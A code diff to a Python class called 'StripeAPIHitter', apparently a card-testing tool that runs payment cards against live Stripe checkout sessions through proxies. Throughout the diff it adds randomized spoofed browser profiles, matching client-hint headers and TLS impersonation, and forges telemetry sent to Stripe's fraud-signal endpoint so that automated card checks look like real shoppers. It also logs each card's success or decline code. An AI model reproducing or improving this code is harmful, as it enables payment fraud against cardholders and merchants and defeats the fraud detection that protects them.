@@ -773,18 +773,22 @@ class StripeAPIHitter:
             locale_map = {'US': 'en-US', 'IN': 'en-IN', 'GB': 'en-GB', 'DE': 'de-DE', 'FR': 'fr-FR', 'BR': 'pt-BR'}
             locale = locale_map.get(country, 'en-US')
 
+            is_pi = isinstance(self.cs_live, str) and self.cs_live.startswith('pi_')
+            is_seti = isinstance(self.cs_live, str) and self.cs_live.startswith('seti_')
+            landing_url = f"https://invoice.stripe.com/i/...#cs_{self.cs_live}" if (is_pi or is_seti) else f"https://checkout.stripe.com/c/pay/{self.cs_live}"
+
             payload = {
                 "v": 2,
                 "tag": "4.7.0_js_fp",
                 "src": "js-tokenize-inner-v3",
                 "a": {
                     "a": self.pk_live,
-                    "b": f"https://checkout.stripe.com/c/pay/{self.cs_live}",
+                    "b": landing_url,
                     "c": int(profile.get('color_depth', '24')),
                     "d": f"{profile.get('screen_width', '1920')}x{profile.get('screen_height', '1080')}",
                     "e": False,
                     "f": locale,
-                    "g": profile.get('os', 'Win32'),
+                    "g": profile.get('platform', 'Win32'),
                     "h": profile['user_agent'],
                     "i": tz_offset,
                     "j": False,
@@ -796,9 +800,23 @@ class StripeAPIHitter:
                 }
             }
             loop = asyncio.get_event_loop()
+            tel_headers = {
+                "content-type": "application/json",
+                "accept": "application/json",
+                "origin": "https://js.stripe.com",
+                "referer": "https://js.stripe.com/",
+                "user-agent": profile['user_agent']
+            }
+            if "sec-ch-ua" in profile:
+                tel_headers["sec-ch-ua"] = profile["sec-ch-ua"]
+            if "sec-ch-ua-mobile" in profile:
+                tel_headers["sec-ch-ua-mobile"] = profile["sec-ch-ua-mobile"]
+            if "sec-ch-ua-platform" in profile:
+                tel_headers["sec-ch-ua-platform"] = profile["sec-ch-ua-platform"]
+
             tel_res = await loop.run_in_executor(None, lambda: cffi_requests.post(
                 "https://m.stripe.com/6",
-                headers={"content-type": "application/json", "origin": "https://checkout.stripe.com", "referer": "https://checkout.stripe.com/", "user-agent": profile['user_agent']},
+                headers=tel_headers,
                 json=payload, proxies=proxies, timeout=10, impersonate=profile["impersonate"]))
             if tel_res.status_code == 200:
                 t = tel_res.json()
@@ -840,9 +858,39 @@ class StripeAPIHitter:
         result = {'attempt': attempt, 'card': card, 'success': False, 'decline_code': None, 'response_time': 0, 'amount': None, 'merchant': None, 'proxy_raw': None, 'error': None}
         
         BROWSER_PROFILES = [
-            {"user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36", "impersonate": "chrome120", "os": "Windows", "color_depth": "32", "screen_height": "1080", "screen_width": "1920"},
-            {"user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36", "impersonate": "chrome120", "os": "MacIntel", "color_depth": "30", "screen_height": "1050", "screen_width": "1680"},
-            {"user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36", "impersonate": "chrome116", "os": "Windows", "color_depth": "24", "screen_height": "1440", "screen_width": "2560"},
+            {
+                "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+                "impersonate": "chrome120",
+                "platform": "Win32",
+                "color_depth": "32",
+                "screen_height": "1080",
+                "screen_width": "1920",
+                "sec-ch-ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
+                "sec-ch-ua-mobile": "?0",
+                "sec-ch-ua-platform": '"Windows"'
+            },
+            {
+                "user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+                "impersonate": "chrome120",
+                "platform": "MacIntel",
+                "color_depth": "30",
+                "screen_height": "1050",
+                "screen_width": "1680",
+                "sec-ch-ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
+                "sec-ch-ua-mobile": "?0",
+                "sec-ch-ua-platform": '"macOS"'
+            },
+            {
+                "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
+                "impersonate": "chrome116",
+                "platform": "Win32",
+                "color_depth": "24",
+                "screen_height": "1440",
+                "screen_width": "2560",
+                "sec-ch-ua": '"Not_A Brand";v="8", "Chromium";v="116", "Google Chrome";v="116"',
+                "sec-ch-ua-mobile": "?0",
+                "sec-ch-ua-platform": '"Windows"'
+            },
         ]
         profile = random.choice(BROWSER_PROFILES)
         
@@ -876,6 +924,9 @@ class StripeAPIHitter:
                     "referer": f"{origin_url}/",
                     "user-agent": profile["user_agent"]
                 }
+                if "sec-ch-ua" in profile: headers["sec-ch-ua"] = profile["sec-ch-ua"]
+                if "sec-ch-ua-mobile" in profile: headers["sec-ch-ua-mobile"] = profile["sec-ch-ua-mobile"]
+                if "sec-ch-ua-platform" in profile: headers["sec-ch-ua-platform"] = profile["sec-ch-ua-platform"]
 
                 address, tz_id, locale = await RandomData.get_address_and_timezone(proxy_url if proxies else None)
                 
@@ -948,9 +999,6 @@ class StripeAPIHitter:
                         "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                         "accept-language": "en-US,en;q=0.9",
                         "accept-encoding": "gzip, deflate, br",
-                        "sec-ch-ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
-                        "sec-ch-ua-mobile": "?0",
-                        "sec-ch-ua-platform": '"Windows"',
                         "sec-fetch-dest": "document",
                         "sec-fetch-mode": "navigate",
                         "sec-fetch-site": "none",
@@ -959,6 +1007,10 @@ class StripeAPIHitter:
                         "user-agent": profile["user_agent"],
                         "cache-control": "max-age=0"
                     }
+                    if "sec-ch-ua" in profile: warmup_headers["sec-ch-ua"] = profile["sec-ch-ua"]
+                    if "sec-ch-ua-mobile" in profile: warmup_headers["sec-ch-ua-mobile"] = profile["sec-ch-ua-mobile"]
+                    if "sec-ch-ua-platform" in profile: warmup_headers["sec-ch-ua-platform"] = profile["sec-ch-ua-platform"]
+
                     warmup_res = await loop.run_in_executor(None, lambda: cffi_requests.get(
                         checkout_url, headers=warmup_headers, proxies=proxies, timeout=15, impersonate=profile["impersonate"]))
                     if warmup_res.status_code == 200:
@@ -978,9 +1030,6 @@ class StripeAPIHitter:
                     el_headers = headers.copy()
                     el_headers["referer"] = f"https://checkout.stripe.com/c/pay/{self.cs_live}"
                     el_headers["accept-language"] = "en-US,en;q=0.9"
-                    el_headers["sec-ch-ua"] = '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"'
-                    el_headers["sec-ch-ua-mobile"] = "?0"
-                    el_headers["sec-ch-ua-platform"] = '"Windows"'
                     await loop.run_in_executor(None, lambda: cffi_requests.get(
                         elements_url, headers=el_headers, proxies=proxies, timeout=10, impersonate=profile["impersonate"]))
                 except Exception:
@@ -995,9 +1044,6 @@ class StripeAPIHitter:
                 pm_headers = headers.copy()
                 pm_headers["Idempotency-Key"] = pm_idempotency
                 pm_headers["accept-language"] = "en-US,en;q=0.9"
-                pm_headers["sec-ch-ua"] = '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"'
-                pm_headers["sec-ch-ua-mobile"] = "?0"
-                pm_headers["sec-ch-ua-platform"] = '"Windows"'
                 pm_headers["sec-fetch-site"] = "cross-site"
                 pm_headers["sec-fetch-mode"] = "cors"
                 pm_headers["sec-fetch-dest"] = "empty"
